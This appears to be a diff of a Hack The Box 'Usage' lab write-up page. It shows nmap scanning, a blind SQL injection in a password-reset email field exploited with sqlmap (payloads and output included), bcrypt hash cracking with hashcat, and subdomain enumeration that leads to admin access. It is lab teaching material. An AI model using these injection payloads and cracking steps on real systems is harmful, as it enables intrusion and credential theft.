@@ -96,154 +96,155 @@
       <div class="content"><h1 id="usage---htb-writeup">Usage - HTB Writeup</h1>
 <p>IP = <code>10.10.11.18</code></p>
 <h3 id="enumeration">Enumeration</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -p22,80 -sCV -A -Pn $IP
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span> ... 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
-</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>| ssh-hostkey: 
-</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>|_http-title: Daily Blogs
-</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>... <span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 80/tcp<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>HOP RTT      ADDRESS
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   37.18 ms 10.10.14.1
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   37.24 ms usage.htb <span style="color:#f92672">(</span>10.10.11.18<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 12.59 seconds
-</span></span></code></pre></div><p>Domain found <code>usage.htb</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -p22,80 -sCV -A -Pn $IP
+<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span> ... 
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">256</span> a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Daily Blogs
+|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+... <span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>
+
+TRACEROUTE <span style="color:#f92672">(</span>using port 80/tcp<span style="color:#f92672">)</span>
+HOP RTT      ADDRESS
+<span style="color:#ae81ff">1</span>   37.18 ms 10.10.14.1
+<span style="color:#ae81ff">2</span>   37.24 ms usage.htb <span style="color:#f92672">(</span>10.10.11.18<span style="color:#f92672">)</span>
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 12.59 seconds
+</code></pre></div><p>Domain found <code>usage.htb</code>.</p>
 <p>After trying some random stuff and running <code>gobuster</code> directory brute forcing, I didn&rsquo;t find anything useful. However after making an account and heading to <code>/forgot-password</code> I found an SQLi in the <code>email</code> input. Ex:
 <code>email=a@a.com' AND 1=1;-- -</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat reqq.txt 
-</span></span><span style="display:flex;"><span>POST /forget-password HTTP/1.1
-</span></span><span style="display:flex;"><span>Host: usage.htb
-</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:109.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/115.0
-</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/avif,image/webp,*/*;q<span style="color:#f92672">=</span>0.8
-</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
-</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
-</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
-</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">84</span>
-</span></span><span style="display:flex;"><span>Origin: http://usage.htb
-</span></span><span style="display:flex;"><span>Connection: close
-</span></span><span style="display:flex;"><span>Referer: http://usage.htb/forget-password
-</span></span><span style="display:flex;"><span>Cookie: XSRF-TOKEN<span style="color:#f92672">=</span>eyJpdiI6Ii82RmVtOXhNc05Gcm92c0xmY3J4Wmc9PSIsInZhbHVlIjoiSjlidzhvVDBXMEF6ajhvUGg2cVRwQ2pJRXB1SDViZnFJWGIzQU1KbUlvOGU2UWxEVVFBWEtqVGpDT2xidW5iNTBZYjJsS2pzT000amNHcjB2dldEQzB1RnQ3VWtJOHZJV1QvSGNaVTlGTGx1L0xUS1JCZWI3eVJmZXBlNnl6aGoiLCJtYWMiOiJiZDBjNTA5MTY5YmI5OGRlYzYwOTdmYTkwZTg2OTQ1NmQ1MDM0ZDRiMmU3YWYxNDMzMTE1MDg5NWQxYTM4MWFkIiwidGFnIjoiIn0%3D; laravel_session<span style="color:#f92672">=</span>eyJpdiI6Im1IK0xjL2p5T0hHOGx5NWVDV2wxeUE9PSIsInZhbHVlIjoiQTBKNDJWOU9uNHljdlVGMldJemYrWS8rOXAycXB0TStnSG1zU2paZDU2Qy9tY21YZ1kyZzhkWHFSUlRGTHU3Y3RuNWFaejFGU3FjdlFjRjdXaEpKeVFCSjliUERvcXVqbERQOVV3cjZGNkFGNVp2Q2IvWTdsQ0M2Z1RYTnd2MVAiLCJtYWMiOiJhOWE4YWYyZGE5NDhiYTc5NGY0MTUwYThjYzE0ODE5NGYxOGQyNzU2YzkyZmVkODA3ZDNhZTcyMTAzYzE0MjMxIiwidGFnIjoiIn0%3D
-</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>_token<span style="color:#f92672">=</span>BDou88iee4DWi2UbrIeFOOqp5zIUYNj0VOia0XA6&amp;email<span style="color:#f92672">=</span>+a%40a.com
-</span></span></code></pre></div><p>After capturing this request using burpsuite and running it through <code>sqlmap</code> I didn&rsquo;t find a ton of useful information the first few times however after turning up the risk/level paramter&rsquo;s and adding some other&rsquo;s I was able to find the database table <code>usage_blog</code> that could be targeted more specifically.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r reqq.txt -p email --batch --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> --dbms<span style="color:#f92672">=</span>mysql --dbs --dump --tables --threads <span style="color:#ae81ff">5</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:08:07<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> parsing HTTP request from <span style="color:#e6db74">&#39;reqq.txt&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:08:07<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing connection to the target URL
-</span></span><span style="display:flex;"><span>got a <span style="color:#ae81ff">302</span> redirect to <span style="color:#e6db74">&#39;http://usage.htb/forget-password&#39;</span>. Do you want to follow? <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> Y
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span> ...
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:13:39<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> checking <span style="color:#66d9ef">if</span> the injection point on POST parameter <span style="color:#e6db74">&#39;email&#39;</span> is a false positive
-</span></span><span style="display:flex;"><span>POST parameter <span style="color:#e6db74">&#39;email&#39;</span> is vulnerable. Do you want to keep testing the others <span style="color:#f92672">(</span><span style="color:#66d9ef">if</span> any<span style="color:#f92672">)</span>? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span> N
-</span></span><span style="display:flex;"><span>sqlmap identified the following injection point<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> with a total of <span style="color:#ae81ff">722</span> HTTP<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> requests:
-</span></span><span style="display:flex;"><span>---
-</span></span><span style="display:flex;"><span>Parameter: email <span style="color:#f92672">(</span>POST<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>    Type: boolean-based blind
-</span></span><span style="display:flex;"><span>    Title: AND boolean-based blind - WHERE or HAVING clause <span style="color:#f92672">(</span>subquery - comment<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>    Payload: _token<span style="color:#f92672">=</span>BDou88iee4DWi2UbrIeFOOqp5zIUYNj0VOia0XA6&amp;email<span style="color:#f92672">=</span> a@a.com<span style="color:#e6db74">&#39; AND 1005=(SELECT (CASE WHEN (1005=1005) THEN 1005 ELSE (SELECT 3960 UNION SELECT 3913) END))-- -
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: time-based blind
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: MySQL &gt; 5.0.12 AND time-based blind (heavy query)
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: _token=BDou88iee4DWi2UbrIeFOOqp5zIUYNj0VOia0XA6&amp;email= a@a.com&#39;</span> AND 9393<span style="color:#f92672">=(</span>SELECT COUNT<span style="color:#f92672">(</span>*<span style="color:#f92672">)</span> FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE <span style="color:#ae81ff">0</span> XOR 1<span style="color:#f92672">)</span>-- cnFS
-</span></span><span style="display:flex;"><span>---
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:13:47<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> the back-end DBMS is MySQL
-</span></span><span style="display:flex;"><span>web server operating system: Linux Ubuntu
-</span></span><span style="display:flex;"><span>web application technology: Nginx 1.18.0
-</span></span><span style="display:flex;"><span>back-end DBMS: MySQL &gt; 5.0.12
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:13:48<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching database names
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:13:48<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching number of databases
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:13:48<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: <span style="color:#ae81ff">3</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:13:50<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieving the length of query output
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:13:50<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: <span style="color:#ae81ff">18</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:14:19<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: information_schema             
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:14:19<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieving the length of query output
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:14:19<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: <span style="color:#ae81ff">18</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:14:47<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: performance_schema             
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:14:47<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieving the length of query output
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:14:47<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: <span style="color:#ae81ff">10</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>13:15:07<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: usage_blog             
-</span></span><span style="display:flex;"><span>available databases <span style="color:#f92672">[</span>3<span style="color:#f92672">]</span>:
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> information_schema
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> performance_schema
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> usage_blog
-</span></span></code></pre></div><p><code>information_schema</code> - Standardized set of read-only views that provide information about all the SQL Server objects (databases, tables, columns, etc.).
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat reqq.txt 
+POST /forget-password HTTP/1.1
+Host: usage.htb
+User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:109.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/avif,image/webp,*/*;q<span style="color:#f92672">=</span>0.8
+Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: <span style="color:#ae81ff">84</span>
+Origin: http://usage.htb
+Connection: close
+Referer: http://usage.htb/forget-password
+Cookie: XSRF-TOKEN<span style="color:#f92672">=</span>eyJpdiI6Ii82RmVtOXhNc05Gcm92c0xmY3J4Wmc9PSIsInZhbHVlIjoiSjlidzhvVDBXMEF6ajhvUGg2cVRwQ2pJRXB1SDViZnFJWGIzQU1KbUlvOGU2UWxEVVFBWEtqVGpDT2xidW5iNTBZYjJsS2pzT000amNHcjB2dldEQzB1RnQ3VWtJOHZJV1QvSGNaVTlGTGx1L0xUS1JCZWI3eVJmZXBlNnl6aGoiLCJtYWMiOiJiZDBjNTA5MTY5YmI5OGRlYzYwOTdmYTkwZTg2OTQ1NmQ1MDM0ZDRiMmU3YWYxNDMzMTE1MDg5NWQxYTM4MWFkIiwidGFnIjoiIn0%3D; laravel_session<span style="color:#f92672">=</span>eyJpdiI6Im1IK0xjL2p5T0hHOGx5NWVDV2wxeUE9PSIsInZhbHVlIjoiQTBKNDJWOU9uNHljdlVGMldJemYrWS8rOXAycXB0TStnSG1zU2paZDU2Qy9tY21YZ1kyZzhkWHFSUlRGTHU3Y3RuNWFaejFGU3FjdlFjRjdXaEpKeVFCSjliUERvcXVqbERQOVV3cjZGNkFGNVp2Q2IvWTdsQ0M2Z1RYTnd2MVAiLCJtYWMiOiJhOWE4YWYyZGE5NDhiYTc5NGY0MTUwYThjYzE0ODE5NGYxOGQyNzU2YzkyZmVkODA3ZDNhZTcyMTAzYzE0MjMxIiwidGFnIjoiIn0%3D
+Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
+
+_token<span style="color:#f92672">=</span>BDou88iee4DWi2UbrIeFOOqp5zIUYNj0VOia0XA6&amp;email<span style="color:#f92672">=</span>+a%40a.com
+
+</code></pre></div><p>After capturing this request using burpsuite and running it through <code>sqlmap</code> I didn&rsquo;t find a ton of useful information the first few times however after turning up the risk/level paramter&rsquo;s and adding some other&rsquo;s I was able to find the database table <code>usage_blog</code> that could be targeted more specifically.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -r reqq.txt -p email --batch --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> --dbms<span style="color:#f92672">=</span>mysql --dbs --dump --tables --threads <span style="color:#ae81ff">5</span>
+
+<span style="color:#f92672">[</span>13:08:07<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> parsing HTTP request from <span style="color:#e6db74">&#39;reqq.txt&#39;</span>
+<span style="color:#f92672">[</span>13:08:07<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing connection to the target URL
+got a <span style="color:#ae81ff">302</span> redirect to <span style="color:#e6db74">&#39;http://usage.htb/forget-password&#39;</span>. Do you want to follow? <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> Y
+<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span> ...
+
+<span style="color:#f92672">[</span>13:13:39<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> checking <span style="color:#66d9ef">if</span> the injection point on POST parameter <span style="color:#e6db74">&#39;email&#39;</span> is a false positive
+POST parameter <span style="color:#e6db74">&#39;email&#39;</span> is vulnerable. Do you want to keep testing the others <span style="color:#f92672">(</span><span style="color:#66d9ef">if</span> any<span style="color:#f92672">)</span>? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span> N
+sqlmap identified the following injection point<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> with a total of <span style="color:#ae81ff">722</span> HTTP<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> requests:
+---
+Parameter: email <span style="color:#f92672">(</span>POST<span style="color:#f92672">)</span>
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause <span style="color:#f92672">(</span>subquery - comment<span style="color:#f92672">)</span>
+    Payload: _token<span style="color:#f92672">=</span>BDou88iee4DWi2UbrIeFOOqp5zIUYNj0VOia0XA6&amp;email<span style="color:#f92672">=</span> a@a.com<span style="color:#e6db74">&#39; AND 1005=(SELECT (CASE WHEN (1005=1005) THEN 1005 ELSE (SELECT 3960 UNION SELECT 3913) END))-- -
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">    Type: time-based blind
+</span><span style="color:#e6db74">    Title: MySQL &gt; 5.0.12 AND time-based blind (heavy query)
+</span><span style="color:#e6db74">    Payload: _token=BDou88iee4DWi2UbrIeFOOqp5zIUYNj0VOia0XA6&amp;email= a@a.com&#39;</span> AND 9393<span style="color:#f92672">=(</span>SELECT COUNT<span style="color:#f92672">(</span>*<span style="color:#f92672">)</span> FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE <span style="color:#ae81ff">0</span> XOR 1<span style="color:#f92672">)</span>-- cnFS
+---
+<span style="color:#f92672">[</span>13:13:47<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL &gt; 5.0.12
+<span style="color:#f92672">[</span>13:13:48<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching database names
+<span style="color:#f92672">[</span>13:13:48<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching number of databases
+<span style="color:#f92672">[</span>13:13:48<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: <span style="color:#ae81ff">3</span>
+<span style="color:#f92672">[</span>13:13:50<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieving the length of query output
+<span style="color:#f92672">[</span>13:13:50<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: <span style="color:#ae81ff">18</span>
+<span style="color:#f92672">[</span>13:14:19<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: information_schema             
+<span style="color:#f92672">[</span>13:14:19<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieving the length of query output
+<span style="color:#f92672">[</span>13:14:19<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: <span style="color:#ae81ff">18</span>
+<span style="color:#f92672">[</span>13:14:47<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: performance_schema             
+<span style="color:#f92672">[</span>13:14:47<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieving the length of query output
+<span style="color:#f92672">[</span>13:14:47<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: <span style="color:#ae81ff">10</span>
+<span style="color:#f92672">[</span>13:15:07<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: usage_blog             
+available databases <span style="color:#f92672">[</span>3<span style="color:#f92672">]</span>:
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> information_schema
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> performance_schema
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> usage_blog
+</code></pre></div><p><code>information_schema</code> - Standardized set of read-only views that provide information about all the SQL Server objects (databases, tables, columns, etc.).
 <code>performance_chema</code> - Provides a way to inspect internal execution of the server at runtime. It includes a number of tables that can be queried to assess the performance of various operations to diagnose problems.
 <code>usage_blog</code> - Blog database
 <img src="/posts/usage.png" alt="title">
 <figure><img src="./usage.png"
-    alt="alt text string" width="auto"><figcaption>
-      <h4>usage</h4>
-    </figcaption>
+         alt="alt text string" width="auto"/><figcaption>
+            <h4>usage</h4>
+        </figcaption>
 </figure>
 </p>
 <p>As you can see we successfully got the hash for the <code>Administrator</code> from the db/table: <code>usage_blog.admin_users</code>.</p>
 <p>After copying the hash and echoing it to a file, then running <code>hashid -m &lt;file&gt;</code> on it&hellip; It output&rsquo;s the mode as:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashid -m hash                                            
-</span></span><span style="display:flex;"><span>--File <span style="color:#e6db74">&#39;hash&#39;</span>--
-</span></span><span style="display:flex;"><span>Analyzing <span style="color:#e6db74">&#39;$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Blowfish<span style="color:#f92672">(</span>OpenBSD<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Hashcat Mode: 3200<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Woltlab Burning Board 4.x 
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> bcrypt <span style="color:#f92672">[</span>Hashcat Mode: 3200<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>--End of file <span style="color:#e6db74">&#39;hash&#39;</span>-- 
-</span></span></code></pre></div><p>Then running hashcat:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">3200</span> -a <span style="color:#ae81ff">0</span> hash /usr/share/wordlists/rockyou.txt
-</span></span></code></pre></div><p>Credentials found: <code>administrator:whatever1</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashid -m hash                                            
+--File <span style="color:#e6db74">&#39;hash&#39;</span>--
+Analyzing <span style="color:#e6db74">&#39;$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2&#39;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Blowfish<span style="color:#f92672">(</span>OpenBSD<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Hashcat Mode: 3200<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Woltlab Burning Board 4.x 
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> bcrypt <span style="color:#f92672">[</span>Hashcat Mode: 3200<span style="color:#f92672">]</span>
+--End of file <span style="color:#e6db74">&#39;hash&#39;</span>-- 
+</code></pre></div><p>Then running hashcat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -m <span style="color:#ae81ff">3200</span> -a <span style="color:#ae81ff">0</span> hash /usr/share/wordlists/rockyou.txt
+</code></pre></div><p>Credentials found: <code>administrator:whatever1</code></p>
 <p>The credentials didn&rsquo;t work on the original login page so I then though of running gobuster dns enumeration using the wordlist <code>/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dns -d <span style="color:#e6db74">&#39;usage.htb&#39;</span>  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt   
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
-</span></span><span style="display:flex;"><span>Gobuster v3.6
-</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain:     usage.htb
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:    <span style="color:#ae81ff">10</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:    1s
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
-</span></span><span style="display:flex;"><span>Starting gobuster in DNS enumeration mode
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
-</span></span><span style="display:flex;"><span>Found: admin.usage.htb
-</span></span><span style="display:flex;"><span>---
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>
-</span></span></code></pre></div><p>Here&hellip; the credentials worked just fine&hellip; <code>admin:whatever1</code></p>
